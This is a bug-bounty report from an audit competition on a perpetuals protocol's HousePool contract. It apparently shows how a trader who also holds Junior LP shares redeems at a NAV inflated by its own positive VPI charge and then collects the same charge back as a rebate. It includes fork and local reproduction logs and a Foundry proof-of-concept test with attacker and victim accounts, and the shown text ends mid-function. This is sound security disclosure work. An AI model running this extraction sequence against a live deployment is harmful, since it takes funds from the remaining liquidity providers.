# \#98332 [SC-Critical] Trader exits Junior at VPI-inflated NAV, then receives the same VPI rebate

**Submitted on Nov 7th 2026 at 04:45:42 UTC by @tinnohofficial for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98332
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield
  - Theft of unclaimed yield

## Description

## Brief/Intro

A skew-increasing position pays positive virtual price impact (VPI) into HousePool. That cash is included in the next Junior redemption price. The **same position** can later close for a lifetime-clamped VPI rebate, paid from the pool after the Junior redemption is funded. A trader who already owns Junior shares can take a share of its own refundable charge out as redemption cash, then collect the rebate while the remaining Junior LPs bear the outflow.

The matched single-position and deployed-release fork controls use the same trade sizes and basket prices, changing whether the close occurs just before or after Junior redemption funding. In the fork, the open receipt records **+6,329.181521 USDG** VPI and the attack close receipt records **−6,329.181521 USDG**. The ordering improves the actor's combined trader-and-LP wealth by **4,187.273867 USDG** and reduces the incumbent Junior holder's value by **4,187.281478 USDG**. Of the actor's branch difference, **4,183.433103 USDG** comes from redemption cash and only **3.840764 USDG** from the changed close-time pool cash flow. The control close VPI is **−6,325.331826 USDG**; the closes are near-identical, not equal.

**Recommended severity: Critical (direct theft of existing Junior LP value).** In the local single-position test, an unrelated holder initially supplies **1M USDG** of Junior principal. Its existing share value falls **3,839.333615 USDG** below its pre-cycle value at an unchanged basket mark, while the same-trades control gains **497.532333 USDG**. The actor receives a funded USDG redemption and later a pool-funded rebate. If the program classifies this transferred VPI component solely as unclaimed yield, **High** is the alternative. Actor wealth includes wallet USDG, clearinghouse balance and Junior shares, net of protocol fees, bounty debits, confidence effects and carry; gas and capital opportunity cost are excluded.

### Why this is not the documented design

The [whitepaper](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md?plain=1#L411-L414) documents immediate positive-VPI cash and later pool-funded rebates. The [accounting specification](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md?plain=1#L158-L174) makes entry and exit use symmetric NAV and [excludes anticipated VPI](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md?plain=1#L1061-L1066) from its price-PnL term. Yet the [security specification](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md?plain=1#L1434-L1444) says the lifetime clamp eliminates rebate-only round-trip extraction, and the project's [regression](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/test/perps/spec/trader/EnginePositionAdmission.t.sol#L474-L520) checks that a charged-and-rebated trader pays execution fees. The clamp protects a trader position, but not ownership of that charge across the trader's Junior redemption. The PoCs measure *trader plus LP* wealth and an incumbent's loss below principal. Unlike the [explicit policy allowing carry-collection timing transfers](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md?plain=1#L731-L740), no VPI document accepts this cross-role extraction.

## Vulnerability Details

### Root cause and execution path

1. A skew-increasing open calculates positive VPI and adds it to the trader's cost ([OpenAccountingLib.sol](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/OpenAccountingLib.sol#L127-L135)). The settlement sidecar transfers the LP portion to HousePool as arrived revenue ([CfdEngineSettlementSidecar.sol](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L446-L464)), increasing accounted pool assets ([HousePool.sol](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L624-L650)).
2. The terminal NAV snapshot starts from physical pool assets and subtracts trader claims, then adds only the signed terminal **price** delta. It has no deduction for a still-refundable positive VPI charge ([HousePoolAccountingLib.sol](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolAccountingLib.sol#L60-L77)). Reconciliation sends unallocated revenue to Junior after any Senior restoration ([HousePoolReconcilePlanLib.sol](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolReconcilePlanLib.sol#L84-L103), [HousePoolWaterfallAccountingLib.sol](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol#L133-L159)). LP epoch settlement reconciles **before** fixing the Junior pricing principal and funding redemptions ([HousePool.sol](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L824-L888), [HousePool.sol](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L944-L999)). The exiting Junior holder therefore receives its portion of the charge as funded USDG.
3. A later skew-reducing close can rebate VPI up to that position's accrued positive lifetime charge ([CloseAccountingLib.sol](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L103-L118)). The planner pays available action rebate from pool cash free of protected trader claims ([CfdEnginePlanLib.sol](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L970-L977)); the sidecar debits HousePool and credits the trader ([CfdEngineSettlementSidecar.sol](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L618-L624)). The actor already holds the funded exit cash; the remaining Junior shares absorb the refund.

The attack requires a matured Junior redemption request, enough free pool cash to fund the exit and a later contingent rebate, a valid live-market Pyth basket, and a position that increases then reduces skew. The rebate is not an unconditional trader claim: a close must generate it, and any part unfunded by free cash is waived. The PoCs prove full payout in their states under the [release's 1% VPI factor, 40% skew limit, 4 bp execution fee, 0.2% initial margin, 10 bp confidence cap, and 40M/80% Senior limits](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/DEPLOYMENT.md?plain=1#L129-L156). The LP shares have passed the ordinary cooldown. Trader orders, LP requests, epoch settlement and claims use public entrypoints and a permissionless keeper. No trusted-role misbehavior or price movement is required.

### Why this is a separate issue

The previously confirmed cross-role VPI report concerns a **negative** VPI rebate held in a protected reserve and an **incoming** Junior LP buying before its clawback. This report concerns **positive** VPI cash already in HousePool, an **outgoing** Junior LP, and that trader position's later rebate. The single-position and fork PoCs require no entrant between charge and rebate. A narrow fix that adds the negative reserve to entry NAV leaves this exit price and funding path intact. A broader cohort-based VPI ownership fix could address both.

The published [temporary pool-liquidity close-rebate finding](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/scan-plether-fi-plether-core-d4541b49.md?plain=1#L1742-L1808) concerns enlarging a fresh close rebate by reducing the VPI denominator. Here the single-position matched branches' close-time pool cash changes differ by **0.010744 USDG**, versus a **4,340.274211 USDG** redemption-cash difference; the fork yields **3.840764 USDG** versus **4,183.433103 USDG**. A same-trades replacement-deposit control restores attack close depth to **10,002,274.284563 USDG**, above the **10,002,000.000000 USDG** open depth, yet the actor gains **2,255.194240 USDG** versus a **2,085.072808 USDG** control loss. The replacement LP loses **4,339.517215 USDG** versus **0.000001 USDG** in control. The transfer therefore survives without reducing the close denominator. The earlier pre-audit [Senior yield dilution finding](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-pre-audit-report.pdf) concerned unpaid Senior yield and was answered by a Senior accounting rewrite; this path uses Junior redemption and the trader's paid positive VPI. The hedged-pair PoC also changes depth around an opposing SHORT, so the single-position, replacement-deposit and fork controls isolate this exit-pricing path.

## Impact Details

The following amounts are USDG, with six-decimal precision. “Actor” includes wallet USDG, clearinghouse balance, and any remaining Junior shares; the hedged test also includes the actor's opposite trader account. Values are changes from the same branch's starting state. Both branches use the same trade sizes, basket prices, confidence and protocol parameters.

| Reproduction | Actor: exit before rebate | Actor: control | Other Junior: exit before rebate | Other Junior: control |
| --- | ---: | ---: | ---: | ---: |
| Single position, 10 bp confidence | **+2,255.190659** | −2,085.072808 | **−3,839.333615** | +497.532333 |
| Deployed Arbitrum Sepolia v2.0.0 local fork, recorded feed confidence | **+2,530.459163** | −1,656.814704 | **−3,981.194948** | +206.086530 |
| Atomic equal LONG/SHORT, 0.10 bp confidence | **+150.756688** | −5,106.516549 | **−4,983.834953** | +269.308480 |

The single-position branch shift is **+4,340.263467 USDG** for the actor and **−4,336.865948 USDG** for the unrelated Junior LP. The actor receives **6,007,325.393476 USDG** of funded redemption cash instead of **6,002,985.119265 USDG** in the close-before-funding control. Treasury receives **1,559.610000 USDG** in both branches. A second consecutive exit/re-entry cycle brings the actor's cumulative gain to **4,493.356511 USDG** and the other Junior LP's cumulative loss to **7,716.491594 USDG**. The actor supplies approximately **6.1M USDG** of Junior and trader capital; ordinary Senior and the other Junior LP supply the rest of the approximately 10M USDG pool.

The fork pins Arbitrum Sepolia block **324032051**, checks **19 deployed protocol runtime hashes**, and reads six deployed feed prices and confidences before replaying them with fresh test timestamps through a local Pyth mock. The deployment [manifest](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/deployments/releases/2026-10-28-perps-arbitrum-sepolia-v2.0.0/manifest.json#L8-L12) names source commit `1209ca8a5b94a4fb6323c7c4585846ed93db3932`; the `packages/perps/src` tree is identical between it and audit commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`. The fork corroborates the audited-code local tests; its hashes verify the pinned deployment, not an independent recompilation at the audit commit. Starting liquidity is **2,000,002 USDG**; public-epoch deposits bring the pool to **10,000,002 USDG**. At the recorded **0.96158954** basket mark, the actor opens a 37,000-lot LONG about 30 seconds before the funding boundary and closes just after it. Junior NAV rises from **6,999,699.876883** to **7,006,050.658793 USDG** after the open. The attack redeems **6,005,388.915624 USDG** versus **6,001,205.482521 USDG** in control. Senior's branch difference is **+0.007611 USDG**; treasury receives **1,423.143876 USDG** in both. At **9.5 bp** confidence per feed, within the release 10 bp cap, the actor still gains **1,592.415177 USDG** versus a **1,889.829633 USDG** control loss.

The equal 4M LONG/SHORT pair uses two actor-controlled trader accounts and one atomic keeper transaction to fill the first open, settle the redemption epoch and fill the opposing open against one neutral $1 tick. The actor supplies about **5.2M USDG**: 5M Junior and two 100,000 USDG trader accounts. Both closes execute later at the same mark. The actor finishes without directional exposure and gains **150.756688 USDG** after four execution fees, two open-order bounty debits and confidence effects, versus a **5,106.516549 USDG** same-trades/no-exit control loss. At **0.18 bp** confidence the gain remains **125.523532 USDG**, before gas and capital cost. The opposing SHORT changes depth and temporarily holds negative-VPI backing, so this test corroborates a flat, pre-gas outcome; the single-position controls isolate the exit-pricing defect. The pair's final reserve and trader claims are zero, and no LP enters between its SHORT rebate and clawback.

The fork is a local simulation using recorded feed observations, not a claim that later signed updates occurred on chain. The harness mock charges no update fee; the fork mock charges 1 wei per update call. Gas and capital opportunity cost are excluded. Repetition requires ordinary Junior exit, re-entry and cooldown/epoch timing. Remaining Junior holders, or a replacement holder who enters before the rebate, bear the loss; no later accounting step reverses the transfer.

### Recommendation

Track positive lifetime VPI that a close can still rebate and keep that potential refund out of Junior redemption **pricing and funding** until no close can generate it. An alternative is cohort accounting that allocates the positive charge and any later rebate to the same LP owners. The fix must handle partial closes, waived rebates, and changing pool depth without counting cash or trader claims twice. Add regression tests that measure one actor's trader and LP wealth across both deposit activation and redemption funding.



## Proof of Concept

## Reproduction

Use audit commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`. Save both complete files below in `packages/perps/test/poc/` and run each command twice from the repository root. Set `ARB_SEPOLIA_RPC_URL` to a read-only Arbitrum Sepolia RPC endpoint for the fork. The fork reads block 324032051; all later trades, LP actions, Pyth replacement and time changes occur inside Foundry. Only out-of-scope Pyth and a local ArbSys block-number shim are substituted. The file checks 19 deployed protocol runtime hashes. The release manifest names source commit `1209ca8a5b94a4fb6323c7c4585846ed93db3932`; its `packages/perps/src` tree matches the audit commit. The deployed-hash checks do not independently prove an audit-commit recompilation.

Financial values below are six-decimal USDG atoms; basket marks use eight decimals. These are selected output lines from two fresh runs of each complete file.

### Local public-path tests

```sh
forge test --root packages/perps --match-path test/poc/PositiveVpiJuniorExitBeforeRebate.t.sol -vv
```

Run 1:

```text
[PASS] test_HedgedConfidenceSensitivity_ObservedFeedScale() (gas: 28303452)
[PASS] test_HedgedOppositeAccountsCaptureVpiAcrossJuniorExitAtConstantPrice() (gas: 28306334)
[PASS] test_exitBetweenPositiveVpiChargeAndRebate() (gas: 12710680)
[PASS] test_replacementDepositRestoresDepthAndStillTransfersValue() (gas: 14047782)
[PASS] test_twoConsecutiveCyclesRemainProfitable() (gas: 13282764)
Ran 2 test suites in 28.88ms (53.81ms CPU time): 5 tests passed, 0 failed, 0 skipped (5 total tests)
```

Run 2:

```text
[PASS] test_exitBetweenPositiveVpiChargeAndRebate() (gas: 12710680)
  ATTACK open pool cash increase 7599678039
  ATTACK redeemed assets 6007325393476
  ATTACK attacker delta 2255190659
  ATTACK victim delta -3839333615
  ATTACK close pool change -4089210463
  ATTACK treasury delta 1559610000
  CONTROL redeemed assets 6002985119265
  CONTROL attacker delta -2085072808
  CONTROL victim delta 497532333
  CONTROL close pool change -4089221207
  CONTROL treasury delta 1559610000
[PASS] test_replacementDepositRestoresDepthAndStillTransfersValue() (gas: 14047782)
  replacement attack open depth 10002000000000
  replacement attack close depth 10002274284563
  replacement attack attacker delta 2255194240
  replacement control attacker delta -2085072808
  replacement attack new LP delta -4339517215
  replacement control new LP delta -1
[PASS] test_twoConsecutiveCyclesRemainProfitable() (gas: 13282764)
  two-cycle attacker delta 4493356511
  two-cycle victim delta -7716491594
[PASS] test_HedgedConfidenceSensitivity_ObservedFeedScale() (gas: 28303452)
  hedged final reserve atoms 0
  hedged final claims atoms 0
  hedged final reserve atoms 0
  hedged final claims atoms 0
  hedged 0.18bp confidence control attacker atoms -5111831496
  hedged 0.18bp confidence control victim atoms 274622451
  hedged 0.18bp confidence attacker atoms 125523532
  hedged 0.18bp confidence victim atoms -4958618420
[PASS] test_HedgedOppositeAccountsCaptureVpiAcrossJuniorExitAtConstantPrice() (gas: 28306334)
  hedged final reserve atoms 0
  hedged final claims atoms 0
  hedged final reserve atoms 0
  hedged final claims atoms 0
  hedged control attacker atoms -5106516549
  hedged attack attacker atoms 150756688
  hedged control victim atoms 269308480
  hedged attack victim atoms -4983834953
  hedged control treasury atoms 4799996000
  hedged attack treasury atoms 4799996000
  hedged control keeper atoms 400000
  hedged attack keeper atoms 400000
Ran 2 test suites in 24.05ms (43.57ms CPU time): 5 tests passed, 0 failed, 0 skipped (5 total tests)
```

### Deployed-release local fork tests

```sh
forge test --root packages/perps --match-path test/poc/PositiveVpiJuniorExitBeforeRebateFork.t.sol -vv
```

Run 1:

```text
[PASS] testFork_maxReleaseConfidence_exitBeforeRebateVsControl() (gas: 13666228)
[PASS] testFork_realConfidence_exitBeforeRebateVsControl() (gas: 13629501)
Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 1.12s (42.89ms CPU time)
```

Run 2:

```text
[PASS] testFork_maxReleaseConfidence_exitBeforeRebateVsControl() (gas: 13666228)
  SCENARIO 9.5-bp confidence per feed
  deployed pool assets at fork 2000002000000
  deployed basket mark 96158954
  pool assets after honest LP funding 10000002000000
  positive open VPI charge 6326269303
  projected Junior NAV before open 6999699876883
  projected Junior NAV after open 7006866371575
  ATTACK close VPI -6326269303
  attack redeemed assets 6006088121624
  ATTACK attacker delta 1592415177
  ATTACK incumbent Junior delta -3042823512
  ATTACK honest Senior delta 27391910
  ATTACK close pool change -3222250218
  ATTACK treasury delta 1422816426
  control redeemed assets 6002605867883
  CONTROL attacker delta -1889829633
  CONTROL incumbent Junior delta 439428908
  CONTROL honest Senior delta 27384299
  CONTROL close pool change -3222259149
  CONTROL close VPI -6326269303
  CONTROL treasury delta 1422816426
[PASS] testFork_realConfidence_exitBeforeRebateVsControl() (gas: 13629501)
  SCENARIO real six-feed confidence
  deployed pool assets at fork 2000002000000
  deployed basket mark 96158954
  pool assets after honest LP funding 10000002000000
  positive open VPI charge 6329181521
  projected Junior NAV before open 6999699876883
  projected Junior NAV after open 7006050658793
  ATTACK close VPI -6329181521
  attack redeemed assets 6005388915624
  ATTACK attacker delta 2530459163
  ATTACK incumbent Junior delta -3981194948
  ATTACK honest Senior delta 27391910
  ATTACK close pool change -4862739872
  ATTACK treasury delta 1423143876
  control redeemed assets 6001205482521
  CONTROL attacker delta -1656814704
  CONTROL incumbent Junior delta 206086530
  CONTROL honest Senior delta 27384299
  CONTROL close pool change -4858899108
  CONTROL close VPI -6325331826
  CONTROL treasury delta 1423143876
Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 698.62ms (39.81ms CPU time)
```

### PositiveVpiJuniorExitBeforeRebate.t.sol

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {IOrderLifecycleBook} from "@plether/perps/interfaces/IOrderLifecycleBook.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";
import {console2} from "forge-std/console2.sol";

/// @notice Positive open VPI enters Junior NAV while a close may rebate that charge if skew reverses
///         and free pool cash is available. The potential rebate is omitted from LP NAV. A trader
///         who owns most of Junior can open before its matured redemption is funded, exit at the
///         temporarily inflated NAV, then close, making remaining Junior holders fund the rebate.
///         Senior capital supplies the position-liability reserve, so the attacker's Junior ownership
///         fraction is not bounded by the pool-wide redemption free-cash fraction.
contract PositiveVpiJuniorExitBeforeRebateSingleTraderTest is BasePerpTest {
    address internal constant SENIOR_LP = address(0x5E010004);
    address internal constant VICTIM = address(0xB0B10004);
    address internal constant ATTACKER = address(0xA77A0004);
    address internal constant KEEPER = address(0xCEE40004);
    address internal constant REPLACEMENT_LP = address(0xD00D0004);

    // Monday 2026-11-09 10:00:00 UTC, outside FAD and oracle-frozen regimes.
    uint256 internal constant T0 = 1_794_218_400;
    uint256 internal constant PRICE = 1e8;
    uint256 internal constant LOT = 1e20;
    uint256 internal constant POSITION_LOTS = 39_000; // 3.9M USDG at PRICE; below the 40% opening cap.
    uint256 internal constant POSITION_SIZE = POSITION_LOTS * LOT;
    uint256 internal constant POSITION_MARGIN = 30_000e6;

    uint256 internal constant SENIOR_ASSETS = 3_000_000e6;
    uint256 internal constant VICTIM_JUNIOR_ASSETS = 1_000_000e6;
    uint256 internal constant ATTACKER_JUNIOR_ASSETS = 6_000_000e6;

    struct Outcome {
        int256 attackerDelta;
        int256 victimDelta;
        int256 closePoolChange;
        uint256 openPoolCashIncrease;
        uint256 redeemedAssets;
        uint256 treasuryDelta;
        int256 replacementDelta;
        uint256 openDepth;
        uint256 closeDepth;
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function test_exitBetweenPositiveVpiChargeAndRebate() public {
        _configureReleaseAndFundActors();

        uint256 branch = vm.snapshotState();
        Outcome memory attack = _runCycle(true, false);
        assertTrue(vm.revertToState(branch));
        Outcome memory control = _runCycle(false, false);

        console2.log("ATTACK open pool cash increase", attack.openPoolCashIncrease);
        console2.log("ATTACK redeemed assets", attack.redeemedAssets);
        console2.log("ATTACK attacker delta", attack.attackerDelta);
        console2.log("ATTACK victim delta", attack.victimDelta);
        console2.log("ATTACK close pool change", attack.closePoolChange);
        console2.log("ATTACK treasury delta", attack.treasuryDelta);
        console2.log("CONTROL redeemed assets", control.redeemedAssets);
        console2.log("CONTROL attacker delta", control.attackerDelta);
        console2.log("CONTROL victim delta", control.victimDelta);
        console2.log("CONTROL close pool change", control.closePoolChange);
        console2.log("CONTROL treasury delta", control.treasuryDelta);

        assertGt(attack.openPoolCashIncrease, 7_000e6, "open credits a material temporary amount to LP NAV");
        assertLt(control.attackerDelta, 0, "identical Router round trip without straddling loses money");
        assertGt(attack.attackerDelta, 0, "NAV-straddling remains profitable at max release confidence");
        assertGt(
            attack.attackerDelta - control.attackerDelta,
            4_000e6,
            "moving only the close across LP funding transfers material value to the attacker"
        );
        assertLt(
            attack.victimDelta - control.victimDelta,
            -4_000e6,
            "the same ordering change transfers material value from the remaining Junior LP"
        );
        assertGt(
            attack.redeemedAssets - control.redeemedAssets,
            4_000e6,
            "the temporary VPI revenue is captured in the attacker's funded redemption"
        );
        assertApproxEqAbs(
            attack.closePoolChange,
            control.closePoolChange,
            1e6,
            "the close economics are unchanged; this is share mispricing, not rebate-depth amplification"
        );
    }

    function test_twoConsecutiveCyclesRemainProfitable() public {
        _configureReleaseAndFundActors();

        int256 attackerStart = int256(_attackerWealth());
        uint256 victimStart = juniorVault.convertToAssets(juniorVault.balanceOf(VICTIM));

        Outcome memory first = _runCycle(true, false);
        _reenterJunior();
        Outcome memory second = _runCycle(true, false);

        int256 attackerTotalDelta = int256(_attackerWealth()) - attackerStart;
        int256 victimTotalDelta = int256(juniorVault.convertToAssets(juniorVault.balanceOf(VICTIM)))
            - int256(victimStart);

        console2.log("cycle 1 attacker delta", first.attackerDelta);
        console2.log("cycle 1 victim delta", first.victimDelta);
        console2.log("cycle 2 attacker delta", second.attackerDelta);
        console2.log("cycle 2 victim delta", second.victimDelta);
        console2.log("two-cycle attacker delta", attackerTotalDelta);
        console2.log("two-cycle victim delta", victimTotalDelta);

        assertGt(first.attackerDelta, 0, "first cycle profits");
        assertGt(second.attackerDelta, 0, "second cycle profits");
        assertGt(attackerTotalDelta, 1_000e6, "two cycles produce repeatable net extraction");
        assertLt(victimTotalDelta, -4_000e6, "two cycles materially drain the incumbent Junior LP");
    }

    function test_replacementDepositRestoresDepthAndStillTransfersValue() public {
        _configureReleaseAndFundActors();
        uint256 branch = vm.snapshotState();
        Outcome memory attack = _runCycle(true, true);
        assertTrue(vm.revertToState(branch));
        Outcome memory control = _runCycle(false, true);

        console2.log("replacement attack open depth", attack.openDepth);
        console2.log("replacement attack close depth", attack.closeDepth);
        console2.log("replacement attack attacker delta", attack.attackerDelta);
        console2.log("replacement control attacker delta", control.attackerDelta);
        console2.log("replacement attack victim delta", attack.victimDelta);
        console2.log("replacement control victim delta", control.victimDelta);
        console2.log("replacement attack new LP delta", attack.replacementDelta);
        console2.log("replacement control new LP delta", control.replacementDelta);

        assertGe(attack.closeDepth, attack.openDepth, "replacement restores close depth");
        assertGt(attack.attackerDelta, 0, "attacker profits even with replacement liquidity");
        assertGt(attack.attackerDelta - control.attackerDelta, 4_000e6, "exit timing transfers value");
        assertLt(attack.victimDelta - control.victimDelta, 0, "incumbent Junior loses");
        assertLt(attack.replacementDelta - control.replacementDelta, 0, "replacement Junior funds rebate");
    }

    function _configureReleaseAndFundActors() internal {
        _setSeniorCapacity(40_000_000e6, 8000);

        IOrderRouterAdminHost.RouterConfig memory config = _routerConfig();
        config.maxExecutionWindowSeconds = 60;
        config.orderExecutionStalenessLimit = 60;
        config.liquidationStalenessLimit = 15;
        config.basketMaxConfidenceRatioBps = 10;
        config.orderSettlementWindow = 15;
        config.maxComponentPublishTimeDivergence = 5;
        config.adverseConfidenceMultiplierBps = 2500;
        config.minOpenNotionalAssets = 1_000e6;
        config.openOrderExecutionBountyBps = 1;
        config.minOpenOrderExecutionBountyAssets = 10_000;
        config.maxOpenOrderExecutionBountyAssets = 200_000;
        config.positionProtectionTriggerBountyAssets = 200_000;
        config.maxPendingOrders = 5;
        _setRouterConfig(config);

        assertEq(engine.executionFeeBps(), 4, "release execution fee");
        assertEq(engine.frozenCloseSpreadBps(), 50, "release frozen close spread");
        assertEq(engine.settlementBufferBps(), 25, "release settlement buffer");
        assertEq(pool.maxSeniorExposureAssets(), 40_000_000e6, "release Senior absolute cap");
        assertEq(pool.maxSeniorShareBps(), 8000, "release Senior share cap");

        vm.warp(T0);
        vm.deal(KEEPER, 10 ether);
        bytes[] memory initialPrice = _releasePriceData();
        vm.prank(KEEPER);
        router.updateMarkPrice(initialPrice);

        // Junior owns all trading revenue; Senior supplies three million of the position-liability reserve.
        _fundTrancheThroughPublicEpoch(juniorVault, VICTIM, VICTIM_JUNIOR_ASSETS);
        _fundTrancheThroughPublicEpoch(juniorVault, ATTACKER, ATTACKER_JUNIOR_ASSETS);
        _fundTrancheThroughPublicEpoch(seniorVault, SENIOR_LP, SENIOR_ASSETS);
        _fundTrader(ATTACKER, 100_000e6);

        // The attacker's deposit activated at least one hour before this point.
        vm.warp(block.timestamp + 10);
    }

    function _fundTrancheThroughPublicEpoch(
        TrancheVault vault,
        address lp,
        uint256 amount
    ) internal {
        settlementToken.mint(lp, amount);
        vm.startPrank(lp);
        settlementToken.approve(address(vault), amount);
        uint256 requestId = vault.requestDeposit(amount, lp, lp);
        vm.stopPrank();

        vm.warp(vault.depositEpochStart(requestId));
        vm.prank(KEEPER);
        pool.settleLpEpoch(0, 0);

        uint256 claimableAssets = vault.claimableDepositRequest(requestId, lp);
        assertEq(claimableAssets, amount, "public epoch activates the requested deposit");
        vm.prank(lp);
        uint256 shares = vault.claimDeposit(requestId, claimableAssets, lp, lp);
        assertGt(shares, 0, "public deposit claim mints shares");
    }

    function _runCycle(
        bool closeAfterFunding,
        bool replaceExit
    ) internal returns (Outcome memory out) {
        uint256 attackerBefore = _attackerWealth();
        uint256 victimBefore = juniorVault.convertToAssets(juniorVault.balanceOf(VICTIM));
        uint256 treasuryBefore = clearinghouse.balanceAssets(engine.protocolTreasury());

        uint256 shares = juniorVault.balanceOf(ATTACKER);
        vm.prank(ATTACKER);
        uint256 requestId = juniorVault.requestRedeem(shares, ATTACKER, ATTACKER);
        uint256 replacementBefore;
        uint256 replacementRequestId;
        if (replaceExit) {
            settlementToken.mint(REPLACEMENT_LP, ATTACKER_JUNIOR_ASSETS);
            replacementBefore = settlementToken.balanceOf(REPLACEMENT_LP)
                + juniorVault.convertToAssets(juniorVault.balanceOf(REPLACEMENT_LP));
            vm.startPrank(REPLACEMENT_LP);
            settlementToken.approve(address(juniorVault), ATTACKER_JUNIOR_ASSETS);
            replacementRequestId = juniorVault.requestDeposit(
                ATTACKER_JUNIOR_ASSETS, REPLACEMENT_LP, REPLACEMENT_LP
            );
            vm.stopPrank();
        }
        uint256 fundingTime = requestId * 1 hours;

        vm.warp(fundingTime - 30);
        uint256 poolBeforeOpen = pool.totalAssets();
        out.openDepth = poolBeforeOpen;
        _routerOpen();
        out.openPoolCashIncrease = pool.totalAssets() - poolBeforeOpen;
        (,,,,,, int256 vpiAccrued) = engine.positions(ATTACKER);
        assertGt(vpiAccrued, 0, "skew-increasing open accrues a positive clamp-bounded VPI charge");

        if (!closeAfterFunding) {
            // Keep the control close immediately before funding so both branches accrue essentially identical carry.
            vm.warp(fundingTime - 2);
            out.closeDepth = pool.totalAssets();
            out.closePoolChange = _routerCloseAndMeasurePoolChange();
        }

        vm.warp(fundingTime);
        _settleLpEpochThroughRouter();
        out.redeemedAssets = juniorVault.claimableRedeemAssets(requestId, ATTACKER);
        vm.prank(ATTACKER);
        juniorVault.withdraw(out.redeemedAssets, ATTACKER, ATTACKER);
        if (replaceExit) {
            uint256 claimable = juniorVault.claimableDepositRequest(replacementRequestId, REPLACEMENT_LP);
            vm.prank(REPLACEMENT_LP);
            juniorVault.claimDeposit(replacementRequestId, claimable, REPLACEMENT_LP, REPLACEMENT_LP);
        }

        if (closeAfterFunding) {
            out.closeDepth = pool.totalAssets();
            out.closePoolChange = _routerCloseAndMeasurePoolChange();
        }

        out.attackerDelta = int256(_attackerWealth()) - int256(attackerBefore);
        out.victimDelta = int256(juniorVault.convertToAssets(juniorVault.balanceOf(VICTIM)))
            - int256(victimBefore);
        out.treasuryDelta = clearinghouse.balanceAssets(engine.protocolTreasury()) - treasuryBefore;
        if (replaceExit) {
            out.replacementDelta = int256(settlementToken.balanceOf(REPLACEMENT_LP)
                + juniorVault.convertToAssets(juniorVault.balanceOf(REPLACEMENT_LP)))
                - int256(replacementBefore);
        }
        assertEq(_sideOpenInterest(CfdTypes.Side.LONG), 0, "cycle ends with no LONG exposure");
    }

    function _reenterJunior() internal {
        vm.startPrank(ATTACKER);
